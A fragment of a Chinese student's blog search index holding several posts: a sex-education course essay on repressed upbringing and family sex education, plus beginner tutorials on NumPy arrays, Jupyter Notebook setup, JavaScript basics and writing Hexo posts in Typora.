Web","slug":"Java-Web","permalink":"http://1905060202.github.io/tags/Java-Web/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://1905060202.github.io/tags/JavaScript/"}]},{"title":"大学生性教育结业论文","date":"2021-06-01T07:25:38.000Z","path":"2021/06/01/大学生性教育结业论文/","text":"丰满的人格需要性教育谈性色变在中国是很常见的现象，这一现象在中学时代尤为突出。高三的时候，迫于备考的压力，有位同学提出了“十月我不撸”的禁欲活动，他认为禁欲有助于提高注意力，碍于从小缺乏性教育，我们普遍认同了他的想法。遗憾的是大家都没有挺过一个月，纷纷阵亡。从这一件事情上可以反映出，性需求是同吃饭喝水一样稀松平常的事情。但是大家在搞这个活动时，是偷偷摸摸的在搞，都有着一副如果被人发现了那就无地自容的面孔，十分谨慎。纸终究包不住火，在最后一个人阵亡后，一个和我们关系很好的女同学得知了我们在搞这件事，脸色巨变，神情愕然。在她的印象中，我们应该是风度翩翩的君子，不应该做这些龌龊猥琐之事。在她的思想里，自慰是猥琐的。 中学时代，但凡在公共场合提到有关性方面的知识，大家都会刻意回避，连初中生物老师居然都会有意的避开性器官的章节，只说让大家自己看看就好。由此可窥见，我国的教育体系中，性教育是严重缺乏的。而性教育的缺乏，会引起一系列的问题。首当其冲的，便是人格的缺陷。 回避型人格与讨好型人格许多学者认为，有回避型人格障碍的人所具有的羞耻感，是由于童年时期的内心经历和父母的训斥造成的。从这一角度去解释为什么缺乏性教育的孩子长大后会有社交障碍，就十分恰当了。以我自身经历来举例。我的父母非常保守，他们从来不会当着我的面去谈有关性的事，我在童年时代也会经常询问父母自己从哪里来，但得到的回答无一例外都是从垃圾桶捡来的，以至于在此后很长的一段时间里，我都坚信自己的生命是垃圾桶赋予的。后来在中学时代，父母才放开了一点点，同我说只要两个人在床上睡上一段时间妈妈就会怀上宝宝。那时我已经12岁了，之前上网时接触过小电影，看到过亲吻的场景，再结合父母这勉强的解释，直到16岁我还以为，只要接吻就会怀孕。这种对性的朦胧感，使我无法正确认识自己更无法正确认识异性，所以在同女生说话时，总会用喝水来掩饰内心的惶恐。最后的最后，与自己接触过的女生都会给自己扣上一顶“不会聊天”的帽子，但其实我的内心是极其渴望和女生交往的，久而久之，一种社交上的自卑感就会产生。而自卑是一种连锁反应，哪怕只要有一方面自卑，如果不及时走出来，自己的许多方面都会受到影响，整个人就会变得抑郁寡欢。 再举一个例子。我在初中时最喜欢看的小电影通常都是师生类的，因为老师代表权威，而征服了老师便代表征服了权威。所以在那个时候，自己意淫的对象就是任课老师。但从来没有人和自己讲过这种心理和行为是否正常，所以我一直认为自己是个心理扭曲的变态，这就会让我在与人交往中，看扁自己，抬高别人，从而产生讨好型人格。好在大学时选了性教育的课程，了解到了这是一种正常的心理现象，便释然了许多。 缺乏性教育的社会危害人格的缺陷往往会导致危害社会的行为，性侵行为就是其中之一。性侵者不会顾及被侵犯的人的感受，单纯只是为了满足自己的兽欲。而这一行径的主要起因，便有关于性意识的淡薄。没有接受过正确的性教育，自然就会把他人物化，把人变成一种手段来满足自己的需求。日本的性教育做的就很成功。在日本针对孩子做性教育工作的时候，大多数都是秉持着从小就开始普及性知识的态度，而做普及性知识的不仅有学校的老师，还有很多孩子的父母也会参与其中。而且性教育在日本并不只是，单纯的作为科普作用，而是作为科目要从小学一直学到高中。高中毕业，还会有合法的成人产业满足大家的性需求。在这个完善的性教育体系下，日本的性侵案件显著减少。 性教育应该从0岁开始参考日本的性教育体系，我认为从小对孩子进行性知识的科普，是必要的。那从什么时候开始呢？这个问题很有趣，问这个问题就等同于在问孩子多大才开始教他待人接物的礼貌。其实这些生活技能，待人接物的态度，或是处事的方式，从孩子出生起我们就会教授，只是看孩子的成长阶段和理解能力，再决定教什么和怎样教。就像孩子开始懂得说话，别人送他礼物要说多谢，见到别人要打招呼。同样的，性教育从0岁就应该开始了，因为从自身经历来看，孩子很早的时候就会有性意识，对好多事，甚至性都会产生好奇。只要我们配合着孩子的成长阶段和理解能力，进行性教育就可以了。 什么是性教育在谈我对家庭性教育的规划之前，首先要解释清楚什么是性教育。第一，性教育，不只是性知识传授。诚然，我们要教性知识，但其实性教育是以性知识为基础，教导孩子建立正确的性态度和正确的性价值观。让孩子明白性是健康和自然的，更加接纳和肯定自己，对建立他的自我形象以及将来成长中遇到的不同情况都有很大帮助。第二，性教育是自洽教育，教导人们去接纳自己，学习与人相处的态度和技巧。第三，性教育是品格教育。孩子有了知识后，可以作出尊重别人和自己，双方都有共识的选择。第四，性教育是爱的教育。因为正确的性教育能够帮助孩子接纳自己，欣赏自己，以及最重要的爱自己！未来他们拥有任何一段亲密关系时，都能够在爱自己之余爱和欣赏别人。第五，性教育是一个生命的教育。是教一个人怎样成为一个“人”，怎样成为一个好人。 浅谈我对家庭性教育的规划家庭性教育离不开以下三个大方向： 确立性态度 充实自己的性知识 把性教育生活化 确立性态度这不单单是跟孩子说他的性态度要怎么样，还要注意自己究竟是对性采取开放态度去面对，还是采取沉默的态度去面对。作为家长自己对于性的态度，会直接影响孩子对性的看法。所以作为家长，要开放自己，接纳孩子的性好奇和性需要。坦诚和孩子沟通，鼓励孩子对性有疑惑和问题时可以和自己一起讨论。 充实自己的性知识作为家长，我们都是在缺乏性教育的环境下成长。所以我们都可能缺乏正确的性知识。作为家长，要主动去探索，主动探求正确的性知识。厘清自己对于性的一些误解、偏见和谬误。不懂不要紧，不懂时可以和小孩一起寻找答案，切勿不懂装懂！作为家长，最重要的是有一份承载那份好奇的开放态度，让孩子提出问题。懂的话就可以及时解答，不懂就一起找答案。 把性教育生活化这一点是很重要的！我们不妨留意身边发生的事情，把握机会，引导小孩发问和一起思考，这不但可以锻炼孩子的分析力和观察力，还可以让他学会说不，拒绝别人。 最后，一定要让孩子意识到，性不是羞耻的，性是可以讨论的，性是健康的。 参考文献： [1] Sallys Toy.幾歲開始性教育？性教育是什麼？家長怎樣做？｜親子性教育｜Sally’s Toy[J].Youtube，2020.","comments":true,"categories":[{"name":"闲言碎语","slug":"闲言碎语","permalink":"http://1905060202.github.io/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"}],"tags":[{"name":"人生","slug":"人生","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E7%94%9F/"},{"name":"论文","slug":"论文","permalink":"http://1905060202.github.io/tags/%E8%AE%BA%E6%96%87/"},{"name":"性教育","slug":"性教育","permalink":"http://1905060202.github.io/tags/%E6%80%A7%E6%95%99%E8%82%B2/"}]},{"title":"python数据分析(二)-数值计算(一)","date":"2021-05-25T07:49:40.000Z","path":"2021/05/25/python数据分析-二/","text":"Numpy数值计算Numpy多维数组Numpy提供了一个名为ndarray的多维数组对象，该数组元素具有固定大小，即Numpy数组元素是同质的，只能存放同一种数据类型的对象，因此能够确定存储数组所需空间的大小，能够运用向量化运算来处理整个数组，具有较高的运算效率。 数组创建可以通过多种方法创建Numpy数组 1.通过array()函数创建ndarray数组 Numpy的array()函数可以创建ndarray数组，对于多维数组的创建、使用嵌套序列数据即可完成。array()函数可以将Python的列表、元组、数组或其他序列类型作为参数创建ndarray数组。 ①一维列表作为array参数： 123import numpy as npa1 = np.array([1,2,3,4,5,6])print(a1) ②二维列表作为array参数： 123import numpy as npa2 = np.array([[1,2,3],[4,5,6]])print(a2) ③字符串作为array参数： 123import numpy as npa3 = np.array(&#x27;abcdefg&#x27;)a3 ④元组作为array参数： 123import numpy as npa4 = np.array((1,2,3))a4 ⑤字典作为array参数： 123import numpy as npa5 = np.array(&#123;&#x27;zhang&#x27;:12,&#x27;dd&#x27;:45&#125;)a5 2.创建特殊数组 Numpy提供了创建特殊数组的函数，如表所示 函数 描述 ones() 创建指定长度或形状的全1数组 ones_like() 以另一个数组为参考，根据其形状和dtype创建全1数组 zeros\\zeros_like() 类似于ones/ones_like，创建全零数组 empty\\empty_like() 同上，创建没有具体值的数组 eye\\identity() 创建正方形的N*N单位矩阵 示例代码： 12345678910111213141516import numpy as npb1 = np.empty((2,3))print(&#x27;b1=&#x27;)print(b1)b2 = np.zeros((3,5))print(&#x27;b2=&#x27;)print(b2)b3 = np.ones((4,2))print(&#x27;b3=&#x27;)print(b3)b4 = np.eye(3)print(&#x27;b4=&#x27;)print(b4)b5 = np.ones_like(b1)print(&#x27;b2=&#x27;)print(b5) 输出结果： 3.从数值范围创建数组从数值范围创建数组的Numpy函数有三个：arange()\\linspace()和logspace()。 arange()函数： 函数arange()根据start指定的范围以及step设置的步长，生成一个ndarry对象，函数格式如下： 1numpy.arange(start,stop,step,dtype) 其中的参数如表所示： 参数 描述 start 起始值，默认为0 stop 终止值(不包含) step 步长，默认为1 dtype 返回的ndarray的数据类型，如果没有提供，则会使用输入数据的类型 linspace()函数 Linspace()函数用于创建一个一维数组，数组是一个等差数列构成的，其格式如下： 1np.linspace(start,stop,num=50,endpoint=True,retstep=False,dtype=None) 其中参数如表所示 参数 描述 start 起始值，默认为0 stop 序列的终止值，如果endpoint为True，该值包含于数列中 num 要生成的等步长的样本数量，默认为50 dtype ndarray的数据类型 endpoint 该值为True时，数列中包含stop值，反之不包含，默认为True retstep 如果为True，生成的数组中会显示间距，反之不显示 logspace()函数 logspace()函数用于创建一个对数运算的等比数列，其格式如下： 1np.logspace(start,stop,num=50,endpoint=True,base=10.0,dtype=None) 参数 描述 start 起始值，默认为0 stop 序列的终止值，如果endpoint为True，该值包含于数列中 num 要生成的等步长的样本数量，默认为50 dtype ndarray的数据类型 endpoint 该值为True时，数列中包含stop值，反之不包含，默认为True base 对数log的底数 实例：从数值范围创建数组 1234567import numpy as npc1 = np.arange(10)c2 = np.linspace(1,10,10)c3 = np.logspace(10,100,10)print(&#x27;c1=&#x27;,c1)print(&#x27;c2=&#x27;,c2)print(&#x27;c3=&#x27;,c3) 4.使用asarray()函数创建Numpy数组函数asarray()把Python的列表、元组等转换为Numpy数组，其格式如下： 1numpy.asarray(a,dtype=None,order=None) 其中参数如表所示： 参数 描述 a 任意形式的输入参数，可以是列表、列表的元组、元组、元组的元组、元组的列表、多维数组 dtype 数据类型(可选) order 可选，有C和F两个选项，分别代表行优先和列优先 示例：asarray()函数的应用 1234import numpy as npd1 = [1,3,5,7,9]d2 = np.asarray(d1)print(d2) 5.随机数数组通过Numpy的随机函数可以创建随机数数数组，在numpy.random模块中，提供了多种随机生成函数，如表所示。 参数 描述 rand() 产生均匀分布的样本值 randint() 给定范围内取随机整数 randn() 产生正态分布的样本值 seed() 随机数种子 permutation() 对一个序列随机排序，不改变原数组 shuffle() 对一个序列随机排序，改变原数组 uniform(low,high,size) 产生具有均匀分布的数组，low表示起始值，high表示结束值，size表示形状 normal(loc,scale,size) 产生具有正态分布的数组，loc表示均值，scale表示标准差 poisson(lam,size) 产生具有泊松分布的数组，lam表示随机事件发生率 rand()函数 rand()函数产生一个指定形状的数组，数组中的值服从[0,1)之间的均匀分布，其格式如下： 1numpy.random.rand(d0,d1,...,dn) 其中，参数d0，d1，…，dn为int型，可选。如果没有参数则返回一个float型的随机数。该随机数服从[0,1]之间的均匀分布。其返回值是一个ndarray对象或者一个float型的值。 示例：rand()函数的应用 123import numpy as npa = np.random.rand(2,4)print(a) uniform()函数 uniform()函数返回一个在区间[low，high)中均匀分布的数组，其格式如下： 1uniform(low=0.0,high=1.0,size=None) 其中，参数low、high是float型或者float型的类数组对象。指定抽样区间为[low，high),low的默认值为0.0，high的默认值为1.0；size是int型或int型元组。指定形状，如果不提供size，则返回一个服从该分布的随机值。 这个读起来比较抽象，我们拿具体示例来看： 12345import numpy as npa = np.random.uniform(size=(2,4))//二行四列b = np.random.uniform(3,5,(2,4))//二行四列print(a)print(b) randn()函数 函数randn()返回一个指定形状的数组，数组中的值服从标准正态分布(均值为0，方差为1)，其格式如下： 1numpy.random.randn(d0,d1,...,dn) 其中，参数d0，d1，…，dn为int型，可选。如果没有参数，则返回一个服从标准正态分布的float型随机数。 返回值：ndarray对象或者float 示例：randn()函数的应用 123import numpy as npa = np.random.randn(2,4)print(a) normal()函数 normal()函数生成一个由size指定形状的数组，数组中的值服从μ=loc，σ=scale的正态分布，其格式如下： 1numpy.random.normal(loc=0.0,scale=1.0,size=None) 函数参数说明如下： ①loc：float型或者float型的类数组对象，指定均值 ②scale：float型或者float型的类数组对象，指定标准差 ③size：int型或者int型类元组，指定了数组的形状。如果不提供size，则loc和scale为标量（不是类数组对象），则返回一个服从该分布的随机数。 输出：ndarray对象或者一个标量 示例：normal()函数的应用 123import numpy as npa = np.random.normal(size=(2,4)) //2 行 4 列print(a) randint()函数 randint()函数生成一个在区间[low,high)中离散均匀抽样的数组，其格式如下： 1numpy.random.randint(low,high=None,size=None,dtype=&#x27;1&#x27;) 函数参数说明如下： ①low、high：int型，指定抽样区间[low，high) ②size：int型或int型元组，指定形状 ③dtype：可选参数，指定数据类型，如int、int64等，默认为np.int 返回值：如果指定了size，则返回一个int型的ndarray对象，否则返回一个服从该分布的int型随机数。 示例：randint()函数的应用 123import numpy as npa = np.random.randint(1,10,size=(2,4))print(a) numpy.random.random(size=None) 函数random()生成[0,1)之间均匀抽样的数组，其格式如下： 1numpy.random.random(size=None) 参数size：int型或者int型的元组，如果不提供则返回一个服从该分布的随机数 返回值：float型或者float型的ndarray对象 示例：random()函数的应用 123import numpy as npa = np.random.random((2,4))print(a) 6.数组对象属性ndarray对象具有多个十分有用的属性，如表所示。 属性 描述 ndim 秩，即数据轴的个数 shape 数组的维度 size 元素的总个数 dtype 数据类型 itemsize 数组中每个元素的字节大小 nbytes 存储在数组所需的字节数量，是itemsize属性值和size属性值之积 T 数组的转量 flat 返回一个numpy.flatiter对象，可以使用flat的迭代器来遍历数组 ①属性T。如果数组的秩小于2，那么所得只是一个数组的视图 ②属性flat提供了一种遍历方式，同时还可以给flat属性赋值，但是赋值会覆盖整个数组内所有元素的值。 示例：random()函数的应用 12345678910import numpy as npa = np.array([np.arange(3),np.linspace(3,5,3)])print(np.arange(5).T) #一维数组的转置为自身视图print(&#x27;a=&#x27;)print(a)print(a.ndim,a.shape,a.size,a.dtype,a.itemsize,a.nbytes)print(&#x27;数组转置&#x27;)print(a.T)for item in a.flat: print(item,end=&#x27;,&#x27;) 7.数组数据类型Python虽然支持整型、浮点型和复数型，但对于科学计算来说，仍然需要更多的数据类型来满足在精度和存储大小方面的各种不同要求。NumPy提供了丰富的数据类型，如表所示。 类型 描述 bool 布尔型(值为True或False)，占用1bit inti 其长度取决于平台的整数(通常为int32或者int64) int8 字节类型(取值范围为-128~127) int16 整型(取值范围为-32768~32767) int32 整型(取值范围为-2^31~2^31-1) int64 整型(取值范围为-2^63~2^63-1) uint8 无符号整型(取值范围为0~655) uint16 无符号整型(取值范围为0~65535) 类型 描述 uint32 无符号整型(取值范围为0~2^32-1) uint64 无符号整型(取值范围为0~2^64-1) float16 半精度浮点型：符号占用1bit，指数占用5bit，尾数占用10bit float32 单精度浮点型：符号占用1bit，指数占用8bit，尾数占用23bit float64或者float 双精度浮点型：符号占用1bit，指数占用11bit，尾数占用52bit complex64 复数类型，由两个32位浮点型(实部和虚部)表示 complex128或者complex 复数类型，由两个64位浮点数(实部和虚部)表示 备注：数据类型的名称以数字结尾，表示该类型的变量所占用的二进制位数 dtype指定数据类型 创建数组时，如果没有指定数组类型，numpy会给新建的数组一个合适的数据类型。当然，也可以给创建的数组指明数据类型，指明数据类型是通过参数dtype实现的 astype转换数据类型 astype()函数可以把数组元素转换成指定类型 注意： 指定类型有两种写法。以float64为例：np.float64和”float64”，这两种方式效果相同 将浮点数转化成整数时元素的小数部分被截断，而不是四舍五入 数值型的字符串可以通过astype方法将其转换为数值类型，但如果字符串中有非数值型进行转换就会报错 astype方法会创建一个新的数组，并不会改变原有数组的数据类型 示例：astype()函数的应用 123456789import numpy as npa = np.array([[1.1,2.2],[3.3,3.4]],dtype=np.float)b = a.astype(np.int)print(&#x27;a=&#x27;,a)print(&#x27;b=&#x27;,b)c = np.arange(5,dtype=np.int8)print(&#x27;c.dtype=&#x27;,c.dtype)print(&#x27;数据类型转换后的dtype=&#x27;,c.astype(np.float).dtype)print(&#x27;c的数据类型没有改变，c.dtype=&#x27;,c.dtype)","comments":true,"categories":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://1905060202.github.io/tags/python/"}]},{"title":"python数据分析(一)","date":"2021-05-24T05:48:10.000Z","path":"2021/05/24/python数据分析-一/","text":"前排知识本文所有的实验都建立在Python环境上，所以一定要配置好环境。 做实验所需的工具： Pycharm Jupyter Notebook Anaconda Python数据分析环境的搭配包括Python的安装以及多个第三方库的安装。 先安装Python，再分别安装需要的第三方库。如果想省事，也可以直接安装Anaconda的方式简化安装。Anaconda包含了本章使用的所有的第三方库。使用Pycharm来运行Juypter并加载Anaconda所搭配的科学计算环境。 安装python本章默认读者已经具备Python基础，就不再赘述Python的安装。如果真的是小白，可以去查阅相关资料。 Python基础：点我 注意：在安装python时，一定要同时安装pip，否则下边的安装都无法进行。 安装数据分析库 安装第三方数据库 1234567pip3 install numpypip3 install scipypip3 install matplotlibpip3 install sklearnpip3 install xlrdpip3 install openpyxlpip3 install seaborn 检查安装 安装后，可以在python环境中使用导入检查是否安装成功(这里使用pycharm很方便) 1234import numpy as npimport matplotlib as pltimport pandas as pdimport sklearn.datasets import ds 如果需要的类库没有安装，则会提示模块不存在，如果没有错误提示。则说明安装成功。 Jupyter Notebook的使用Jupyter Notebook是IPython Notebook的继承者，是一个交互式笔记本，支持运行40多种编程语言。它本质上是一个支持实施 代码、数学方程、可视化和Markdown的Web应用程序。对于数据分析，Jupyter Notebook最大的优点是可以重现整个分析过程，并将说明文字、代码、图标、公式和结论都整合在一个文档中。用户可以通过电子邮件、Dropbox、Github和Jupyter Notebook Viewer将分析结果分享给其他人。 Jupyter Notebook是一个非常强大的工具，常用于交互式地开发和展示数据科学项目。它将代码和它的输出集成到一个文档中，并且结合了可视的叙述性文本、数学方程和其他丰富的媒体。它直观的工作流促进了迭代和快速开发，使得Jupyter Notebook在当代数据科学分析和越来越多的科学研究中越来越受欢迎。最重要的是，作为开源项目，它是完全免费的。 安装Jupyter Notebook 使用如下命令安装Jupyter Notebook 1pip3 install jupyter 启动Jupyter Notebook 注意：Jupyter Notebook在启动后只允许访问启动目录中包含的文件（包括子目录中包含的文件），并且在Jupyter Notebook中创建的文件也保存在启动目录中，在启动Jupyter Notebook之前需要修改当前目录。 启动Jupyter Notebook之前先做准备工作。 创建目录（文件夹）。例如，在D盘下创建notebook文件夹 改变系统的当前目录，把当前目录更改为创建的目录（文件夹）。 准备工作完成后，开始启动Jupyter Notebook。在Windows系统下的命令行或者在Linux系统下的终端输入命令Jupyter notebook后按【Enter】键即可启动Jupyter Notebook。启动后会自动打开系统默认的浏览器，自动展示Jupyter Notebook的界面。正所谓无图无真相，接下来让我们看一下在Windows系统下，如何操作。 第一步，按【Win】+【R】启动运行，输入cmd打开命令行： ​ 第二步，切换到新创建的文件夹，输入Jupyter notebook，开始工作。 现在，可以看到新创建的文件夹下已经有文件存在了。因为我创建了之后改了个名，默认情况下文件名是Untitled。 启动后可以看到浏览器地址栏显示http://localhost:8888/tree。其中，localhost不是一个网站，而是表示本地机器中服务的内容。Jupyter Notebook是Web应用程序，它启动了一个本地的Python服务器，将这些应用程序（Jupyter）提供给Web浏览器，使其从根本上独立于平台，并具有Web上共享的优势。 新建一个Notebook 打开Jupyter Notebook以后会在系统默认的浏览器中出现Jupyter Notebook的界面（Home）。单击右上方的New下拉按钮，出现下拉列表，选择Python3选项，进入Python脚本编辑界面。 下拉列表中是创建的Notebook类型，其中，TextFile为纯文本型，Folder为文件夹，Python3表示Python运行脚本，灰色字体表示不可用项目。 Jupyter Notebook界面 Jupyter Notebook文档由一系列单元（cell）构成，单元有两种形式。 代码单元。代码单元是编写代码的地方，其左边有“In[]:”符号，编写代码后，单击界面上方工具栏中的“运行”按钮，执行程序，其结果会在对应代码单元的下方显示。 Markdown单元。Markdown单元对文本进行编辑，采用Markdown语法规范，可以设置文本格式、插入链接、图片甚至数学公式。Markdown也可以运行，运行后显示格式化的文本（原文本被替代）。 Jupyter Notebook的两种模式 编辑模式。用于编辑文本和代码，对于Markdown单元，选中单元并按【Enter】键（或者双击）进入编辑模式；对于代码单元，选中单元后直接进入编辑模式。编辑模式的单元左侧显示绿色竖线。 命令模式。用于执行键盘输入的快捷命令，在编辑模式下通过按【Enter】键进入命令模式。命令模式的单元左侧显示蓝色竖线。 检查点 当创建一个新的Notebook时，Jupyter Notebook都会创建一个检查点文件和一个Notebook文件；它将位于保存位置的隐藏子目录中，称作.ipynb_checkpoints，也是一个.ipynb文件。默认情况下，Jupyter将每隔120s自动保存Notebook，而不会改变Notebook文件。当“保存和检查点”时，Notebook和检查点文件都将被更新。因此，检查点能够在发生意外事件时恢复未保存的工作，通过菜单File-&gt;Revert to CheckPoints恢复到检查点。 Markdown Markdown是一种轻量级、易于学习的、可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Jupyter Notebook的Markdown单元作为基础的Markdown的功能更加强大","comments":true,"categories":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://1905060202.github.io/tags/python/"}]},{"title":"玩转JavaScript(二)","date":"2021-05-23T14:25:10.000Z","path":"2021/05/23/玩转JavaScript-二/","text":"前排提示本节包含如下几个知识点： 严格检查模式strict 字符串类型详解 数组类型详解 对象类型详解 分支和循环详解（流程控制） 卖个关子在学习JavaScript的过程中，console.log()会频繁出现，如果你不懂它是什么，那么在学习、调试代码的时候就会走很多弯路。 console.log()是JavaScript中的一个内置函数，用于在控制台输出信息；该方法对于开发过程进行测试很有帮助。可以输出之前在其中定义的任何类型的变量，或者只输出需要显示给用户的任何消息。 语法1console.log(message); 参数：它接受一个参数，该参数可以是数组、对象或任何消息。 返回值：返回给定参数的值。 下面通过示例来看看console.log()方法的使用 示例一：传递字符串作为参数 如果字符串传递给函数console.log()，那么该方法将显示它。 12var student = &#x27;student&#x27;;console.log(student); 示例2：传递文本消息作为参数 1console.log(&#x27;hello world&#x27;); 神秘的console对象Console对象用于Javascript调试。 Javascript原生中默认是没有Console对象的，这是宿主对象（也就是Browser）提供的内置对象。用于访问调试控制台，在不同的browser中效果可能不同。 console常见的两个用途是： 显示网页代码运行时的错误信息 提供了一个命令行接口，用来与网页代码互动 发车了严格检查模式 strict12&#x27;use strict&#x27;//严格检查模式，预防JavaScript的随意性导致产生的问题let i = 1; 局部变量建议都使用let去定义。 其中，’use strict’ 必须写在JavaScript的第一行。 要确保idea对于Javascript的设置同上图所示，使用es6标准。 字符串类型 正常字符串我们使用单引号，或者双引号包裹 注意转义字符 \\ 12345\\&#x27;\\n\\t\\u4e2d \\\\Unicode字符\\x41 \\\\ASCii字符 多行字符串编写 123456&#x27;use strict&#x27;;var msg = ` 你好 我叫胡雅宁 是一个本科生`; 用Tab键上方英文状态下的``包裹住多行文字 模板字符串 12345&#x27;use strict&#x27;;let name = &#x27;yaning&#x27;;let age = 3;let msg = `你好呀，$&#123;name&#125;`; 字符串长度 1str.length 字符串的可变性-不可变 1234var student = &#x27;student&#x27;;student[0] = 1;console.log(student); 大小写转换 123//注意，这里是方法，不是属性了student.toUpperCase()student.toLowerCase() student.indexOf(‘t’) substring 123[)student.substring(1)//从第一个字符串到最后一个字符串student.substring(1,3)//[1,3) 数组 Array可以包含任意的数据类型 1var arr = [1,2,3,4,5,6] 长度 1arr.length 注意：假给arr.length赋值，数组大小就会发生变化，如果赋值过小，元素就会丢失。 indexOf，通过元素获得下标索引 12arr.indexof(2)1 字符串的”1”和数字1是不同的 slice()截取Array()的一部分，返回一个新数组。 push、pop 12arr.push(&#x27;a&#x27;,&#x27;b&#x27;)//压入到尾部arr.pop()//弹出尾部的一个元素 unshift()、shift() 12arr.unshift(&#x27;a&#x27;,&#x27;b&#x27;)//在头部添加元素arr.shift()//弹出头部的元素 排序sort() 123[&#x27;b&#x27;,&#x27;c&#x27;,&#x27;a&#x27;]arr.sort()[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;] 元素反转 123[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;]arr.reverse()[&quot;d&quot;, &quot;c&quot;, &quot;b&quot;, &quot;a&quot;] concat() 1arr.concat([1,2,3]) 可见，concat()方法并不会把原数组干掉。只是会返回一个新的数组。 连接符join 打印拼接数组，使用特定的字符串连接 也不会改变原数组哦！ 多维数组 1var arr = [[1,2],[3,4],[5,6]] 对象若干个键值对 = =。 12345678var person = &#123; name : &#x27;huyaning&#x27;, age : 20, sex : &#x27;male&#x27;, legion : &#x27;湖南&#x27;, major : &#x27;数据科学与大数据技术&#x27;, Ideal_university : &#x27;深圳大学&#x27;&#125; js对象中，{……}表示一个对象，键值对描述属性xxxx：xxxx，多个属性间用逗号隔开，最后一个属性不加逗号。 Javascript中所有的键都是字符串，值是任意对象！ 对象赋值 1person.name = &#x27;胡雅宁&#x27; 动态删减属性 1delete person.legion 动态的添加 1person.Ideal_university_high_level = &#x27;中山大学&#x27; 判断属性值是否在这个对象中 xxx in xxx Javascript中所有的键都是字符串，值是任意对象！ 1&#x27;age&#x27; in person 流程控制 if判断 123456var age = 3;if(age&gt;3)&#123; alert(&quot;i love you&quot;)&#125;else&#123; alert(&#x27;i hate you&#x27;)&#125; while循环,注意要避免程序死循环 12345var age = 20;while(age &lt; 70)&#123; age = age + 1; console.log(age);&#125; for循环 1234var age = 20;for(let i =1;i&lt;20;i++)&#123; console.log(i);&#125; 数组循环 1234var age = [1,2,5,9,18,21,32,35,47]age.forEach(function(value)&#123; console.log(value) &#125;) 1234567var age = [1,8,10,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]for (var num in age)&#123; if (age.hasOwnProperty(num))&#123; console.log(&#x27;存在&#x27;) console.log(age[num]) &#125;&#125;","comments":true,"categories":[{"name":"脚本语言","slug":"脚本语言","permalink":"http://1905060202.github.io/categories/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"Java Web","slug":"Java-Web","permalink":"http://1905060202.github.io/tags/Java-Web/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://1905060202.github.io/tags/JavaScript/"}]},{"title":"如何利用Typora方便快捷地写博客","date":"2021-05-22T13:15:57.000Z","path":"2021/05/22/如何利用Typora方便快捷地写博客/","text":"Typora大法之乾坤大挪移因为我的博客是基于hexo搭建的，所以写博客用的文件都为.md的格式。起初写博客用的软件是Notepad++，因为是看CodeSheep的视频入门的，羊哥推荐的软件就是Notepad++，所以我就从21年一月初一直用到五月中旬。说句实话，在写博客的时候最让我头痛的事情就是导入图片这一块。比如要进行效果演示，在Notepad++的编辑器中书写格式如下： 1![](/images/Javascript/xxx.png/jpg) 格式看起来很简洁，写起来好像没什么困难的，的确如此。但是当我需要进行大量的效果演示的时候，这简洁代码背后隐藏的是大量的截图、保存截图的工作。一开始我只会用qq的【Ctrl+Alt+A】进行截图，截图过后还要手动保存在本地，手动调配文件保存路径，这就让我非常苦恼。好在现在没有了这种苦恼，因为我发现了Windows10自带的截图快捷键【Shift+Win+S】搭配上Typora会产生极其简单的导入图片操作。 不卖关子了，直接上干货。 你必须要用相对路径写博客在上干货之前，还是要卖一点点小关子滴，嘿嘿！ 首先，我们要知道相对路径是什么，以及如何使用相对路径来写博客。 相对路径就是指由这个文件所在的路径引起的跟其它文件（或文件夹）的路径关系。使用相对路径可以为我们带来非常多的便利。HTML绝对路径(absolute path)指带域名的文件的完整路径。 以上是百度百科对于相对路径的定义。为了更好的让大家理解什么是相对路径以及掌握使用相对路径的方法，请认真看如下图片 红框框中圈出的是绝对路径，它代表在电脑文件系统中的绝对位置。而相对路径是这样表示的： 蓝线上方所示的就是相对路径。可以看出，相对路径对比于绝对路径少了前面的一部分。如上的相对路径中，../所代表的意思是，.md（就是本文的博客文件）文件所在的文件夹的上级文件夹的位置。所以../images代表的就是与.md文件所在的文件夹同级的文件夹images。如此一来，寻找文件依赖的就是此文件的上级文件夹，而并非绝对的文件路径。对我来说，相对路径使用最频繁的地方就在于写博客。因为博客要远端部署在github上，而部署在github上的博客文件中多多少少都会有图片引用，如果要引用图片那必须要指出图片所在的文件目录。文件目录必须要用相对路径来写，否则会产生灾难性的后果= =。 举个例子，我有一张图片存在D：/github/blog/source/images/中。我的博客文件的路径是D：/github/blog/source/posts/。如果我想在博客中用绝对路径引入这张图片，那必须要从D：/开始写（C：/也可以，看文件放在哪个盘），而部署在远端的文件中，并没有D：/这个目录，所以图片就GG了。但是要用相对路径的话，那就美滋滋啦。我直接写../images/xx.jpg就可以了（图片文件是.jpg格式的），具体原理在上面的粗体部分已经很详细的说过。 超级干货来了在掌握了前面的知识后，你将会看到一场精彩绝伦的乾坤大挪移！ 打开偏好设置 选择图像 填写相对路径 举个例子，我有一张图片存在D：/github/blog/source/images/Javascript中。我写的这篇博客文件的路径是D：/github/blog/source/posts/。那么我要填写的相对路径就如图所示。 利用Windows10自带的截图工具，快捷键【Shift+Win+S】截图 按Ctrl+V在Typora中直接粘贴（就这一点，是Typora最牛b的地方） 